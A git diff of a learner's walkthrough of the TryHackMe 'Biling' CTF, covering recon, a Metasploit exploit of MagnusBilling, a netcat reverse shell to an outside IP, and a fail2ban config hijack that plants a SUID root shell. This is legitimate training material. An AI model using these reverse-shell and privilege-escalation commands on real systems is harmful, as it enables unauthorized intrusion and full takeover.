@@ -1,5 +1,4 @@
-# TryHackMe CTF Challenge: Biling
-
+# Challenge: Biling
 
 ## Skill used:
 - OSINT
@@ -19,7 +18,7 @@ Entering the IP address on our browser reveals a login page for banking website.
 
 I did some searching and it seems that MagnusBiling is an actual legitimate business lol, and they are open source. 
 
-[insert recon_01.png here]
+![recon_01](images/recon_01.png)
 
 ### Nmap
 Using Nmap to scan the ports of the server, looking for any open ports that we can exploit. I would have used rustscan but I'm doing this CTF on VM, on a MacOS and so the Kali Linux infrastructure is sightly modified which makes me unable to install `.deb` file onto my machine :/ 
@@ -30,7 +29,7 @@ Using Nmap to scan the ports of the server, looking for any open ports that we c
 - sV: Gather info what services are listening on the open ports
 - -T5: Timing template, increasing num of threads mean faster scanning time (not recommend for stealth recon)
 
-[insert recon_02.png here]
+![recon_02](images/recon_02.png)
 
 #### Output:
 PORT     STATE SERVICE  VERSION
@@ -51,7 +50,7 @@ I decide to do some more snooping around for any other files with Gobuster, ran 
 - -w: path to wordlist 
 - -x: extensions to be filtered and look for 
 
-[insert recon_03.png]
+![recon_03](images/recon_03.png)
 
 We found some JUICYY stuff from our enumeration attempt. There seems to be an `archive` page containing folder storing assets, which open for opportunities to carry out reverse shell attack 
 
@@ -59,22 +58,22 @@ Looking into one of the dir `lib`, we found a bunch of other folders, and just a
 
 P.S: I didn't scanned it well enough, but there was a README.md file, revealing the web application is in version 7.x.x
 
-[insert recon_04.png]
+![recon_04](images/recon_04.png)
 
 ## Exploitation
 
 ### Metasploit 
 We use the exploit available on Metasploit `msfconsole> use exploit/linux/http/magnusbilling`, all we need to do insert our IP address and the targeted machine IP address. 
 
-[insert exploit_01.png]
+![exploit_01](images/exploit_01.png)
 
 Nice it seems we got access to the server, and by snooping around the dir and files, we found our `user.txt` within `home/magnus`. 
 
-[insert exploit_02.png]
+![exploit_02](images/exploit_02.png)
 
 I created a shell to access the server via my linux terminal, and see if there's any ways to escalate our privileges. If we run `sudo -l' which list all of the commands you're allowed to run with sudo, which return an interesting result.
 
-[insert exploit_03.png]
+![exploit_03](images/exploit_03.png)
 
 
 ### Privilege Escalation 
@@ -99,6 +98,18 @@ Key config files:
 #### Upgrading Our shell
 - Need to upgrade our dumb shell to full TTY(teletypewriter) - provide us with an interactive & full functional command-line interface
 
+I created a shell inside `metepreter` & then started a reverse shell connection 
+`busybox nc 10.14.90.235 9999 -e /bin/bash`
+- busybox: contains many applets (commands), one of them is nc (netcat)
+- nc: creates TCP/UDP connection, connect back to your attacking machine
+- 10.14.90.235 9999: Host IP address
+- 9999: Attacker's IP Address 
+- -e /bin/bash: remote target runs Bash(shell) and pipes input/output over the TCP connection
+
+Attacker side:
+`nc -lvnp 9999`
+
+Then we run the following:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash");'
 CTRL + Z         #backgrounds netcat session
@@ -107,14 +118,70 @@ fg               #brings netcat session back to the foreground
 export TERM=xterm
 ```
 
-#### Hunting for Users in the fail2ban group
-We run 
+#### Shell as Root 
+The idea from the article showed above is to customize a config in its config dir, and write code in that it execute with root permissions- but unfortunately, we only have read-only access to the dir & files 
+
+We can see the `fail2ban-client` is a process started by `root`
+
+![exploit_04](images/exploit_04.png)
+
+To get around this, we can copy the config dir, and refer it when we execute `fail2ban`
+
+In the `fail2ban-client` command, the `-c` option specifies the config dir for Fail2Ban, this will come in handy.
+
+We first make a complete replica of the original dir(etc/fail2ban) in a dir(tmp/fail2ban) that we have read-write permission in, using `rsync`
+`rsync -av /etc/fail2ban/ /tmp/fail2ban/`
+- rsync: a fast & efficient copying tools, good for backups/mirroring
+- a: archive mode:perserve literally EVERYTHING i.e ownerships, permissions, timestamps..etc
+- v: verbose: shows what being copied
+
+```
+cat > /tmp/script <<EOF
+#!/bin/sh
+cp /bin/bash /tmp/bash
+chmod 755 /tmp/bash
+chmod u+s /tmp/bash
+EOF
+chmod +x /tmp/script
+```
+- Creates a malicious /tmp/script that copies bash into /tmp.
+- Makes it executable and sets SUID bit (so it runs as root when triggered).
 
 
+```
+cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
+[Definition]
+actionstart = /tmp/script
+EOF
+``` 
+- New action definition: on jail start, run /tmp/script.
 
 
+```
+cat >> /tmp/fail2ban/jail.local <<EOF
+[my-custom-jail]
+enabled = true
+action = custom-start-command
+EOF
+```
+- Creates a new jail called [my-custom-jail].
+- This jail will run our custom action at startup.
+
+```
+cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
+[Definition]
+EOF
+```
+- Minimal filter file (needed for Fail2ban to accept the jail).
+
+`sudo fail2ban-client -c /tmp/fail2ban/ -v restart`
+- Restarts Fail2ban using /tmp configs.
+- On startup, Fail2ban runs our jail, triggering /tmp/script.
+- /tmp/bash is now a root-owned SUID shell.
+
+After that the only thing we need to do, is run `/tmp/bash -p` which will give us root shell and access to the root.txt!
+
+![exploit_06](images/exploit_06.png)
 
 ## Final Words 
-FUCK VM, more time was spent troubleshoot the VM than the actual CTF I felt like xD 
-
-
+FUCK VM, more time was spent troubleshoot the VM than the actual CTF I felt like. I think I switched 3 desktops across period of 5 hours in total attempting this CTF. Overall, I learnt a lot despite feeling way out of depth near the end haha, definitely need more practice on Privilege Escalation, Metasploit, NetCat and other theoretical concepts/knowledges, since I'm mainly learning on the go
